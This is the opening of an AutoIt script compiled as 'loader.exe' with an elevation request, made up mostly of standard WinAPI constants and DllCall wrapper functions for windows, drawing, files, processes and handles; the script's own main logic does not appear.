#region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Icon=H:\Immagini\term-30x30.ico
#AutoIt3Wrapper_Outfile=loader.exe
#AutoIt3Wrapper_Outfile_x64=loader_x64.exe
#AutoIt3Wrapper_Compression=4
#AutoIt3Wrapper_UseUpx=n
#AutoIt3Wrapper_Compile_Both=y
#AutoIt3Wrapper_UseX64=y
#AutoIt3Wrapper_Res_Comment=Coded by WireFreak
#AutoIt3Wrapper_Res_Description=wirefreak.pen.io
#AutoIt3Wrapper_Res_Fileversion=1.3.2
#AutoIt3Wrapper_Res_Language=1040
#AutoIt3Wrapper_Res_requestedExecutionLevel=highestAvailable
#AutoIt3Wrapper_Add_Constants=n
#AutoIt3Wrapper_Run_Tidy=y
#endregion ;**** Directives created by AutoIt3Wrapper_GUI ****
; *** Start added by AutoIt3Wrapper ***
#include <StructureConstants.au3>
#include <SecurityConstants.au3>
#include <FileConstants.au3>
#include <MemoryConstants.au3>
#include <ColorConstants.au3>
#include <ProcessConstants.au3>
#include <ButtonConstants.au3>
#include <WindowsConstants.au3>
#include <StaticConstants.au3>
#include <GUIConstantsEx.au3>
; *** End added by AutoIt3Wrapper ***
#region
#endregion

Func _SendMessage($hwnd, $imsg, $wparam = 0, $lparam = 0, $ireturn = 0, $wparamtype = "wparam", $lparamtype = "lparam", $sreturntype = "lresult")
	Local $aresult = DllCall("user32.dll", $sreturntype, "SendMessageW", "hwnd", $hwnd, "uint", $imsg, $wparamtype, $wparam, $lparamtype, $lparam)
	If @error Then Return SetError(@error, @extended, "")
	If $ireturn >= 0 And $ireturn <= 4 Then Return $aresult[$ireturn]
	Return $aresult
EndFunc   ;==>_SendMessage

Func _SendMessageA($hwnd, $imsg, $wparam = 0, $lparam = 0, $ireturn = 0, $wparamtype = "wparam", $lparamtype = "lparam", $sreturntype = "lresult")
	Local $aresult = DllCall("user32.dll", $sreturntype, "SendMessageA", "hwnd", $hwnd, "uint", $imsg, $wparamtype, $wparam, $lparamtype, $lparam)
	If @error Then Return SetError(@error, @extended, "")
	If $ireturn >= 0 And $ireturn <= 4 Then Return $aresult[$ireturn]
	Return $aresult
EndFunc   ;==>_SendMessageA

Global $__gainprocess_winapi[64][2] = [[0, 0]]
Global $__gawinlist_winapi[64][2] = [[0, 0]]
Global Const $__winapiconstant_wm_setfont = 48
Global Const $__winapiconstant_fw_normal = 400
Global Const $__winapiconstant_default_charset = 1
Global Const $__winapiconstant_out_default_precis = 0
Global Const $__winapiconstant_clip_default_precis = 0
Global Const $__winapiconstant_default_quality = 0
Global Const $__winapiconstant_format_message_allocate_buffer = 256
Global Const $__winapiconstant_format_message_from_system = 4096
Global Const $__winapiconstant_logpixelsx = 88
Global Const $__winapiconstant_logpixelsy = 90
Global Const $hgdi_error = Ptr(-1)
Global Const $invalid_handle_value = Ptr(-1)
Global Const $clr_invalid = -1
Global Const $__winapiconstant_flashw_caption = 1
Global Const $__winapiconstant_flashw_tray = 2
Global Const $__winapiconstant_flashw_timer = 4
Global Const $__winapiconstant_flashw_timernofg = 12
Global Const $__winapiconstant_gw_hwndnext = 2
Global Const $__winapiconstant_gw_child = 5
Global Const $__winapiconstant_di_mask = 1
Global Const $__winapiconstant_di_image = 2
Global Const $__winapiconstant_di_normal = 3
Global Const $__winapiconstant_di_compat = 4
Global Const $__winapiconstant_di_defaultsize = 8
Global Const $__winapiconstant_di_nomirror = 16
Global Const $__winapiconstant_display_device_attached_to_desktop = 1
Global Const $__winapiconstant_display_device_primary_device = 4
Global Const $__winapiconstant_display_device_mirroring_driver = 8
Global Const $__winapiconstant_display_device_vga_compatible = 16
Global Const $__winapiconstant_display_device_removable = 32
Global Const $__winapiconstant_display_device_modespruned = 134217728
Global Const $null_brush = 5
Global Const $null_pen = 8
Global Const $black_brush = 4
Global Const $dkgray_brush = 3
Global Const $dc_brush = 18
Global Const $gray_brush = 2
Global Const $hollow_brush = $null_brush
Global Const $ltgray_brush = 1
Global Const $white_brush = 0
Global Const $black_pen = 7
Global Const $dc_pen = 19
Global Const $white_pen = 6
Global Const $ansi_fixed_font = 11
Global Const $ansi_var_font = 12
Global Const $device_default_font = 14
Global Const $default_gui_font = 17
Global Const $oem_fixed_font = 10
Global Const $system_font = 13
Global Const $system_fixed_font = 16
Global Const $default_palette = 15
Global Const $mb_precomposed = 1
Global Const $mb_composite = 2
Global Const $mb_useglyphchars = 4
Global Const $ulw_alpha = 2
Global Const $ulw_colorkey = 1
Global Const $ulw_opaque = 4
Global Const $wh_callwndproc = 4
Global Const $wh_callwndprocret = 12
Global Const $wh_cbt = 5
Global Const $wh_debug = 9
Global Const $wh_foregroundidle = 11
Global Const $wh_getmessage = 3
Global Const $wh_journalplayback = 1
Global Const $wh_journalrecord = 0
Global Const $wh_keyboard = 2
Global Const $wh_keyboard_ll = 13
Global Const $wh_mouse = 7
Global Const $wh_mouse_ll = 14
Global Const $wh_msgfilter = -1
Global Const $wh_shell = 10
Global Const $wh_sysmsgfilter = 6
Global Const $wpf_asyncwindowplacement = 4
Global Const $wpf_restoretomaximized = 2
Global Const $wpf_setminposition = 1
Global Const $kf_extended = 256
Global Const $kf_altdown = 8192
Global Const $kf_up = 32768
Global Const $llkhf_extended = BitShift($kf_extended, 8)
Global Const $llkhf_injected = 16
Global Const $llkhf_altdown = BitShift($kf_altdown, 8)
Global Const $llkhf_up = BitShift($kf_up, 8)
Global Const $ofn_allowmultiselect = 512
Global Const $ofn_createprompt = 8192
Global Const $ofn_dontaddtorecent = 33554432
Global Const $ofn_enablehook = 32
Global Const $ofn_enableincludenotify = 4194304
Global Const $ofn_enablesizing = 8388608
Global Const $ofn_enabletemplate = 64
Global Const $ofn_enabletemplatehandle = 128
Global Const $ofn_explorer = 524288
Global Const $ofn_extensiondifferent = 1024
Global Const $ofn_filemustexist = 4096
Global Const $ofn_forceshowhidden = 268435456
Global Const $ofn_hidereadonly = 4
Global Const $ofn_longnames = 2097152
Global Const $ofn_nochangedir = 8
Global Const $ofn_nodereferencelinks = 1048576
Global Const $ofn_nolongnames = 262144
Global Const $ofn_nonetworkbutton = 131072
Global Const $ofn_noreadonlyreturn = 32768
Global Const $ofn_notestfilecreate = 65536
Global Const $ofn_novalidate = 256
Global Const $ofn_overwriteprompt = 2
Global Const $ofn_pathmustexist = 2048
Global Const $ofn_readonly = 1
Global Const $ofn_shareaware = 16384
Global Const $ofn_showhelp = 16
Global Const $ofn_ex_noplacesbar = 1
Global Const $tmpf_fixed_pitch = 1
Global Const $tmpf_vector = 2
Global Const $tmpf_truetype = 4
Global Const $tmpf_device = 8
Global Const $duplicate_close_source = 1
Global Const $duplicate_same_access = 2
Global Const $tagcursorinfo = "dword Size;dword Flags;handle hCursor;" & $tagpoint
Global Const $tagdisplay_device = "dword Size;wchar Name[32];wchar String[128];dword Flags;wchar ID[128];wchar Key[128]"
Global Const $tagflashwinfo = "uint Size;hwnd hWnd;dword Flags;uint Count;dword TimeOut"
Global Const $tagiconinfo = "bool Icon;dword XHotSpot;dword YHotSpot;handle hMask;handle hColor"
Global Const $tagmemorystatusex = "dword Length;dword MemoryLoad;" & "uint64 TotalPhys;uint64 AvailPhys;uint64 TotalPageFile;uint64 AvailPageFile;" & "uint64 TotalVirtual;uint64 AvailVirtual;uint64 AvailExtendedVirtual"

Func _WinAPI_AttachConsole($iprocessid = -1)
	Local $aresult = DllCall("kernel32.dll", "bool", "AttachConsole", "dword", $iprocessid)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_AttachConsole

Func _WinAPI_AttachThreadInput($iattach, $iattachto, $fattach)
	Local $aresult = DllCall("user32.dll", "bool", "AttachThreadInput", "dword", $iattach, "dword", $iattachto, "bool", $fattach)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_AttachThreadInput

Func _WinAPI_Beep($ifreq = 500, $iduration = 1000)
	Local $aresult = DllCall("kernel32.dll", "bool", "Beep", "dword", $ifreq, "dword", $iduration)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_Beep

Func _WinAPI_BitBlt($hdestdc, $ixdest, $iydest, $iwidth, $iheight, $hsrcdc, $ixsrc, $iysrc, $irop)
	Local $aresult = DllCall("gdi32.dll", "bool", "BitBlt", "handle", $hdestdc, "int", $ixdest, "int", $iydest, "int", $iwidth, "int", $iheight, "handle", $hsrcdc, "int", $ixsrc, "int", $iysrc, "dword", $irop)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_BitBlt

Func _WinAPI_CallNextHookEx($hhk, $icode, $wparam, $lparam)
	Local $aresult = DllCall("user32.dll", "lresult", "CallNextHookEx", "handle", $hhk, "int", $icode, "wparam", $wparam, "lparam", $lparam)
	If @error Then Return SetError(@error, @extended, -1)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_CallNextHookEx

Func _WinAPI_CallWindowProc($lpprevwndfunc, $hwnd, $msg, $wparam, $lparam)
	Local $aresult = DllCall("user32.dll", "lresult", "CallWindowProc", "ptr", $lpprevwndfunc, "hwnd", $hwnd, "uint", $msg, "wparam", $wparam, "lparam", $lparam)
	If @error Then Return SetError(@error, @extended, -1)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_CallWindowProc

Func _WinAPI_ClientToScreen($hwnd, ByRef $tpoint)
	DllCall("user32.dll", "bool", "ClientToScreen", "hwnd", $hwnd, "struct*", $tpoint)
	Return SetError(@error, @extended, $tpoint)
EndFunc   ;==>_WinAPI_ClientToScreen

Func _WinAPI_CloseHandle($hobject)
	Local $aresult = DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hobject)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_CloseHandle

Func _WinAPI_CombineRgn($hrgndest, $hrgnsrc1, $hrgnsrc2, $icombinemode)
	Local $aresult = DllCall("gdi32.dll", "int", "CombineRgn", "handle", $hrgndest, "handle", $hrgnsrc1, "handle", $hrgnsrc2, "int", $icombinemode)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_CombineRgn

Func _WinAPI_CommDlgExtendedError()
	Local Const $cderr_dialogfailure = 65535
	Local Const $cderr_findresfailure = 6
	Local Const $cderr_initialization = 2
	Local Const $cderr_loadresfailure = 7
	Local Const $cderr_loadstrfailure = 5
	Local Const $cderr_lockresfailure = 8
	Local Const $cderr_memallocfailure = 9
	Local Const $cderr_memlockfailure = 10
	Local Const $cderr_nohinstance = 4
	Local Const $cderr_nohook = 11
	Local Const $cderr_notemplate = 3
	Local Const $cderr_registermsgfail = 12
	Local Const $cderr_structsize = 1
	Local Const $fnerr_buffertoosmall = 12291
	Local Const $fnerr_invalidfilename = 12290
	Local Const $fnerr_subclassfailure = 12289
	Local $aresult = DllCall("comdlg32.dll", "dword", "CommDlgExtendedError")
	If @error Then Return SetError(@error, @extended, 0)
	Switch $aresult[0]
		Case $cderr_dialogfailure
			Return SetError($aresult[0], 0, "The dialog box could not be created." & @LF & "The common dialog box function's call to the DialogBox function failed." & @LF & "For example, this error occurs if the common dialog box call specifies an invalid window handle.")
		Case $cderr_findresfailure
			Return SetError($aresult[0], 0, "The common dialog box function failed to find a specified resource.")
		Case $cderr_initialization
			Return SetError($aresult[0], 0, "The common dialog box function failed during initialization." & @LF & "This error often occurs when sufficient memory is not available.")
		Case $cderr_loadresfailure
			Return SetError($aresult[0], 0, "The common dialog box function failed to load a specified resource.")
		Case $cderr_loadstrfailure
			Return SetError($aresult[0], 0, "The common dialog box function failed to load a specified string.")
		Case $cderr_lockresfailure
			Return SetError($aresult[0], 0, "The common dialog box function failed to lock a specified resource.")
		Case $cderr_memallocfailure
			Return SetError($aresult[0], 0, "The common dialog box function was unable to allocate memory for internal structures.")
		Case $cderr_memlockfailure
			Return SetError($aresult[0], 0, "The common dialog box function was unable to lock the memory associated with a handle.")
		Case $cderr_nohinstance
			Return SetError($aresult[0], 0, "The ENABLETEMPLATE flag was set in the Flags member of the initialization structure for the corresponding common dialog box," & @LF & "but you failed to provide a corresponding instance handle.")
		Case $cderr_nohook
			Return SetError($aresult[0], 0, "The ENABLEHOOK flag was set in the Flags member of the initialization structure for the corresponding common dialog box," & @LF & "but you failed to provide a pointer to a corresponding hook procedure.")
		Case $cderr_notemplate
			Return SetError($aresult[0], 0, "The ENABLETEMPLATE flag was set in the Flags member of the initialization structure for the corresponding common dialog box," & @LF & "but you failed to provide a corresponding template.")
		Case $cderr_registermsgfail
			Return SetError($aresult[0], 0, "The RegisterWindowMessage function returned an error code when it was called by the common dialog box function.")
		Case $cderr_structsize
			Return SetError($aresult[0], 0, "The lStructSize member of the initialization structure for the corresponding common dialog box is invalid")
		Case $fnerr_buffertoosmall
			Return SetError($aresult[0], 0, "The buffer pointed to by the lpstrFile member of the OPENFILENAME structure is too small for the file name specified by the user." & @LF & "The first two bytes of the lpstrFile buffer contain an integer value specifying the size, in TCHARs, required to receive the full name.")
		Case $fnerr_invalidfilename
			Return SetError($aresult[0], 0, "A file name is invalid.")
		Case $fnerr_subclassfailure
			Return SetError($aresult[0], 0, "An attempt to subclass a list box failed because sufficient memory was not available.")
	EndSwitch
	Return Hex($aresult[0])
EndFunc   ;==>_WinAPI_CommDlgExtendedError

Func _WinAPI_CopyIcon($hicon)
	Local $aresult = DllCall("user32.dll", "handle", "CopyIcon", "handle", $hicon)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_CopyIcon

Func _WinAPI_CreateBitmap($iwidth, $iheight, $iplanes = 1, $ibitsperpel = 1, $pbits = 0)
	Local $aresult = DllCall("gdi32.dll", "handle", "CreateBitmap", "int", $iwidth, "int", $iheight, "uint", $iplanes, "uint", $ibitsperpel, "ptr", $pbits)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_CreateBitmap

Func _WinAPI_CreateCompatibleBitmap($hdc, $iwidth, $iheight)
	Local $aresult = DllCall("gdi32.dll", "handle", "CreateCompatibleBitmap", "handle", $hdc, "int", $iwidth, "int", $iheight)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_CreateCompatibleBitmap

Func _WinAPI_CreateCompatibleDC($hdc)
	Local $aresult = DllCall("gdi32.dll", "handle", "CreateCompatibleDC", "handle", $hdc)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_CreateCompatibleDC

Func _WinAPI_CreateEvent($pattributes = 0, $fmanualreset = True, $finitialstate = True, $sname = "")
	Local $snametype = "wstr"
	If $sname = "" Then
		$sname = 0
		$snametype = "ptr"
	EndIf
	Local $aresult = DllCall("kernel32.dll", "handle", "CreateEventW", "ptr", $pattributes, "bool", $fmanualreset, "bool", $finitialstate, $snametype, $sname)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_CreateEvent

Func _WinAPI_CreateFile($sfilename, $icreation, $iaccess = 4, $ishare = 0, $iattributes = 0, $psecurity = 0)
	Local $ida = 0, $ism = 0, $icd = 0, $ifa = 0
	If BitAND($iaccess, 1) <> 0 Then $ida = BitOR($ida, $generic_execute)
	If BitAND($iaccess, 2) <> 0 Then $ida = BitOR($ida, $generic_read)
	If BitAND($iaccess, 4) <> 0 Then $ida = BitOR($ida, $generic_write)
	If BitAND($ishare, 1) <> 0 Then $ism = BitOR($ism, $file_share_delete)
	If BitAND($ishare, 2) <> 0 Then $ism = BitOR($ism, $file_share_read)
	If BitAND($ishare, 4) <> 0 Then $ism = BitOR($ism, $file_share_write)
	Switch $icreation
		Case 0
			$icd = $create_new
		Case 1
			$icd = $create_always
		Case 2
			$icd = $open_existing
		Case 3
			$icd = $open_always
		Case 4
			$icd = $truncate_existing
	EndSwitch
	If BitAND($iattributes, 1) <> 0 Then $ifa = BitOR($ifa, $file_attribute_archive)
	If BitAND($iattributes, 2) <> 0 Then $ifa = BitOR($ifa, $file_attribute_hidden)
	If BitAND($iattributes, 4) <> 0 Then $ifa = BitOR($ifa, $file_attribute_readonly)
	If BitAND($iattributes, 8) <> 0 Then $ifa = BitOR($ifa, $file_attribute_system)
	Local $aresult = DllCall("kernel32.dll", "handle", "CreateFileW", "wstr", $sfilename, "dword", $ida, "dword", $ism, "ptr", $psecurity, "dword", $icd, "dword", $ifa, "ptr", 0)
	If @error Or $aresult[0] = Ptr(-1) Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_CreateFile

Func _WinAPI_CreateFont($nheight, $nwidth, $nescape = 0, $norientn = 0, $fnweight = $__winapiconstant_fw_normal, $bitalic = False, $bunderline = False, $bstrikeout = False, $ncharset = $__winapiconstant_default_charset, $noutputprec = $__winapiconstant_out_default_precis, $nclipprec = $__winapiconstant_clip_default_precis, $nquality = $__winapiconstant_default_quality, $npitch = 0, $szface = "Arial")
	Local $aresult = DllCall("gdi32.dll", "handle", "CreateFontW", "int", $nheight, "int", $nwidth, "int", $nescape, "int", $norientn, "int", $fnweight, "dword", $bitalic, "dword", $bunderline, "dword", $bstrikeout, "dword", $ncharset, "dword", $noutputprec, "dword", $nclipprec, "dword", $nquality, "dword", $npitch, "wstr", $szface)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_CreateFont

Func _WinAPI_CreateFontIndirect($tlogfont)
	Local $aresult = DllCall("gdi32.dll", "handle", "CreateFontIndirectW", "struct*", $tlogfont)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_CreateFontIndirect

Func _WinAPI_CreatePen($ipenstyle, $iwidth, $ncolor)
	Local $aresult = DllCall("gdi32.dll", "handle", "CreatePen", "int", $ipenstyle, "int", $iwidth, "dword", $ncolor)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_CreatePen

Func _WinAPI_CreateProcess($sappname, $scommand, $psecurity, $pthread, $finherit, $iflags, $penviron, $sdir, $pstartupinfo, $pprocess)
	Local $tcommand = 0
	Local $sappnametype = "wstr", $sdirtype = "wstr"
	If $sappname = "" Then
		$sappnametype = "ptr"
		$sappname = 0
	EndIf
	If $scommand <> "" Then
		$tcommand = DllStructCreate("wchar Text[" & 260 + 1 & "]")
		DllStructSetData($tcommand, "Text", $scommand)
	EndIf
	If $sdir = "" Then
		$sdirtype = "ptr"
		$sdir = 0
	EndIf
	Local $aresult = DllCall("kernel32.dll", "bool", "CreateProcessW", $sappnametype, $sappname, "struct*", $tcommand, "ptr", $psecurity, "ptr", $pthread, "bool", $finherit, "dword", $iflags, "ptr", $penviron, $sdirtype, $sdir, "ptr", $pstartupinfo, "ptr", $pprocess)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_CreateProcess

Func _WinAPI_CreateRectRgn($ileftrect, $itoprect, $irightrect, $ibottomrect)
	Local $aresult = DllCall("gdi32.dll", "handle", "CreateRectRgn", "int", $ileftrect, "int", $itoprect, "int", $irightrect, "int", $ibottomrect)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_CreateRectRgn

Func _WinAPI_CreateRoundRectRgn($ileftrect, $itoprect, $irightrect, $ibottomrect, $iwidthellipse, $iheightellipse)
	Local $aresult = DllCall("gdi32.dll", "handle", "CreateRoundRectRgn", "int", $ileftrect, "int", $itoprect, "int", $irightrect, "int", $ibottomrect, "int", $iwidthellipse, "int", $iheightellipse)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_CreateRoundRectRgn

Func _WinAPI_CreateSolidBitmap($hwnd, $icolor, $iwidth, $iheight, $brgb = 1)
	Local $hdc = _WinAPI_GetDC($hwnd)
	Local $hdestdc = _WinAPI_CreateCompatibleDC($hdc)
	Local $hbitmap = _WinAPI_CreateCompatibleBitmap($hdc, $iwidth, $iheight)
	Local $hold = _WinAPI_SelectObject($hdestdc, $hbitmap)
	Local $trect = DllStructCreate($tagrect)
	DllStructSetData($trect, 1, 0)
	DllStructSetData($trect, 2, 0)
	DllStructSetData($trect, 3, $iwidth)
	DllStructSetData($trect, 4, $iheight)
	If $brgb Then
		$icolor = BitOR(BitAND($icolor, 65280), BitShift(BitAND($icolor, 255), -16), BitShift(BitAND($icolor, 16711680), 16))
	EndIf
	Local $hbrush = _WinAPI_CreateSolidBrush($icolor)
	_WinAPI_FillRect($hdestdc, $trect, $hbrush)
	If @error Then
		_WinAPI_DeleteObject($hbitmap)
		$hbitmap = 0
	EndIf
	_WinAPI_DeleteObject($hbrush)
	_WinAPI_ReleaseDC($hwnd, $hdc)
	_WinAPI_SelectObject($hdestdc, $hold)
	_WinAPI_DeleteDC($hdestdc)
	If Not $hbitmap Then Return SetError(1, 0, 0)
	Return $hbitmap
EndFunc   ;==>_WinAPI_CreateSolidBitmap

Func _WinAPI_CreateSolidBrush($ncolor)
	Local $aresult = DllCall("gdi32.dll", "handle", "CreateSolidBrush", "dword", $ncolor)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_CreateSolidBrush

Func _WinAPI_CreateWindowEx($iexstyle, $sclass, $sname, $istyle, $ix, $iy, $iwidth, $iheight, $hparent, $hmenu = 0, $hinstance = 0, $pparam = 0)
	If $hinstance = 0 Then $hinstance = _WinAPI_GetModuleHandle("")
	Local $aresult = DllCall("user32.dll", "hwnd", "CreateWindowExW", "dword", $iexstyle, "wstr", $sclass, "wstr", $sname, "dword", $istyle, "int", $ix, "int", $iy, "int", $iwidth, "int", $iheight, "hwnd", $hparent, "handle", $hmenu, "handle", $hinstance, "ptr", $pparam)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_CreateWindowEx

Func _WinAPI_DefWindowProc($hwnd, $imsg, $iwparam, $ilparam)
	Local $aresult = DllCall("user32.dll", "lresult", "DefWindowProc", "hwnd", $hwnd, "uint", $imsg, "wparam", $iwparam, "lparam", $ilparam)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_DefWindowProc

Func _WinAPI_DeleteDC($hdc)
	Local $aresult = DllCall("gdi32.dll", "bool", "DeleteDC", "handle", $hdc)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_DeleteDC

Func _WinAPI_DeleteObject($hobject)
	Local $aresult = DllCall("gdi32.dll", "bool", "DeleteObject", "handle", $hobject)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_DeleteObject

Func _WinAPI_DestroyIcon($hicon)
	Local $aresult = DllCall("user32.dll", "bool", "DestroyIcon", "handle", $hicon)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_DestroyIcon

Func _WinAPI_DestroyWindow($hwnd)
	Local $aresult = DllCall("user32.dll", "bool", "DestroyWindow", "hwnd", $hwnd)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_DestroyWindow

Func _WinAPI_DrawEdge($hdc, $ptrrect, $nedgetype, $grfflags)
	Local $aresult = DllCall("user32.dll", "bool", "DrawEdge", "handle", $hdc, "ptr", $ptrrect, "uint", $nedgetype, "uint", $grfflags)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_DrawEdge

Func _WinAPI_DrawFrameControl($hdc, $ptrrect, $ntype, $nstate)
	Local $aresult = DllCall("user32.dll", "bool", "DrawFrameControl", "handle", $hdc, "ptr", $ptrrect, "uint", $ntype, "uint", $nstate)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_DrawFrameControl

Func _WinAPI_DrawIcon($hdc, $ix, $iy, $hicon)
	Local $aresult = DllCall("user32.dll", "bool", "DrawIcon", "handle", $hdc, "int", $ix, "int", $iy, "handle", $hicon)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_DrawIcon

Func _WinAPI_DrawIconEx($hdc, $ix, $iy, $hicon, $iwidth = 0, $iheight = 0, $istep = 0, $hbrush = 0, $iflags = 3)
	Local $ioptions
	Switch $iflags
		Case 1
			$ioptions = $__winapiconstant_di_mask
		Case 2
			$ioptions = $__winapiconstant_di_image
		Case 3
			$ioptions = $__winapiconstant_di_normal
		Case 4
			$ioptions = $__winapiconstant_di_compat
		Case 5
			$ioptions = $__winapiconstant_di_defaultsize
		Case Else
			$ioptions = $__winapiconstant_di_nomirror
	EndSwitch
	Local $aresult = DllCall("user32.dll", "bool", "DrawIconEx", "handle", $hdc, "int", $ix, "int", $iy, "handle", $hicon, "int", $iwidth, "int", $iheight, "uint", $istep, "handle", $hbrush, "uint", $ioptions)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_DrawIconEx

Func _WinAPI_DrawLine($hdc, $ix1, $iy1, $ix2, $iy2)
	_WinAPI_MoveTo($hdc, $ix1, $iy1)
	If @error Then Return SetError(@error, @extended, False)
	_WinAPI_LineTo($hdc, $ix2, $iy2)
	If @error Then Return SetError(@error, @extended, False)
	Return True
EndFunc   ;==>_WinAPI_DrawLine

Func _WinAPI_DrawText($hdc, $stext, ByRef $trect, $iflags)
	Local $aresult = DllCall("user32.dll", "int", "DrawTextW", "handle", $hdc, "wstr", $stext, "int", -1, "struct*", $trect, "uint", $iflags)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_DrawText

Func _WinAPI_DuplicateHandle($hsourceprocesshandle, $hsourcehandle, $htargetprocesshandle, $idesiredaccess, $finherithandle, $ioptions)
	Local $acall = DllCall("kernel32.dll", "bool", "DuplicateHandle", "handle", $hsourceprocesshandle, "handle", $hsourcehandle, "handle", $htargetprocesshandle, "handle*", 0, "dword", $idesiredaccess, "bool", $finherithandle, "dword", $ioptions)
	If @error Or Not $acall[0] Then Return SetError(1, @extended, 0)
	Return $acall[4]
EndFunc   ;==>_WinAPI_DuplicateHandle

Func _WinAPI_EnableWindow($hwnd, $fenable = True)
	Local $aresult = DllCall("user32.dll", "bool", "EnableWindow", "hwnd", $hwnd, "bool", $fenable)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_EnableWindow

Func _WinAPI_EnumDisplayDevices($sdevice, $idevnum)
	Local $tname = 0, $iflags = 0, $adevice[5]
	If $sdevice <> "" Then
		$tname = DllStructCreate("wchar Text[" & StringLen($sdevice) + 1 & "]")
		DllStructSetData($tname, "Text", $sdevice)
	EndIf
	Local $tdevice = DllStructCreate($tagdisplay_device)
	Local $idevice = DllStructGetSize($tdevice)
	DllStructSetData($tdevice, "Size", $idevice)
	DllCall("user32.dll", "bool", "EnumDisplayDevicesW", "struct*", $tname, "dword", $idevnum, "struct*", $tdevice, "dword", 1)
	If @error Then Return SetError(@error, @extended, 0)
	Local $in = DllStructGetData($tdevice, "Flags")
	If BitAND($in, $__winapiconstant_display_device_attached_to_desktop) <> 0 Then $iflags = BitOR($iflags, 1)
	If BitAND($in, $__winapiconstant_display_device_primary_device) <> 0 Then $iflags = BitOR($iflags, 2)
	If BitAND($in, $__winapiconstant_display_device_mirroring_driver) <> 0 Then $iflags = BitOR($iflags, 4)
	If BitAND($in, $__winapiconstant_display_device_vga_compatible) <> 0 Then $iflags = BitOR($iflags, 8)
	If BitAND($in, $__winapiconstant_display_device_removable) <> 0 Then $iflags = BitOR($iflags, 16)
	If BitAND($in, $__winapiconstant_display_device_modespruned) <> 0 Then $iflags = BitOR($iflags, 32)
	$adevice[0] = True
	$adevice[1] = DllStructGetData($tdevice, "Name")
	$adevice[2] = DllStructGetData($tdevice, "String")
	$adevice[3] = $iflags
	$adevice[4] = DllStructGetData($tdevice, "ID")
	Return $adevice
EndFunc   ;==>_WinAPI_EnumDisplayDevices

Func _WinAPI_EnumWindows($fvisible = True, $hwnd = Default)
	__winapi_enumwindowsinit()
	If $hwnd = Default Then $hwnd = _WinAPI_GetDesktopWindow()
	__winapi_enumwindowschild($hwnd, $fvisible)
	Return $__gawinlist_winapi
EndFunc   ;==>_WinAPI_EnumWindows

Func __winapi_enumwindowsadd($hwnd, $sclass = "")
	If $sclass = "" Then $sclass = _WinAPI_GetClassName($hwnd)
	$__gawinlist_winapi[0][0] += 1
	Local $icount = $__gawinlist_winapi[0][0]
	If $icount >= $__gawinlist_winapi[0][1] Then
		ReDim $__gawinlist_winapi[$icount + 64][2]
		$__gawinlist_winapi[0][1] += 64
	EndIf
	$__gawinlist_winapi[$icount][0] = $hwnd
	$__gawinlist_winapi[$icount][1] = $sclass
EndFunc   ;==>__winapi_enumwindowsadd

Func __winapi_enumwindowschild($hwnd, $fvisible = True)
	$hwnd = _WinAPI_GetWindow($hwnd, $__winapiconstant_gw_child)
	While $hwnd <> 0
		If (Not $fvisible) Or _WinAPI_IsWindowVisible($hwnd) Then
			__winapi_enumwindowschild($hwnd, $fvisible)
			__winapi_enumwindowsadd($hwnd)
		EndIf
		$hwnd = _WinAPI_GetWindow($hwnd, $__winapiconstant_gw_hwndnext)
	WEnd
EndFunc   ;==>__winapi_enumwindowschild

Func __winapi_enumwindowsinit()
	ReDim $__gawinlist_winapi[64][2]
	$__gawinlist_winapi[0][0] = 0
	$__gawinlist_winapi[0][1] = 64
EndFunc   ;==>__winapi_enumwindowsinit

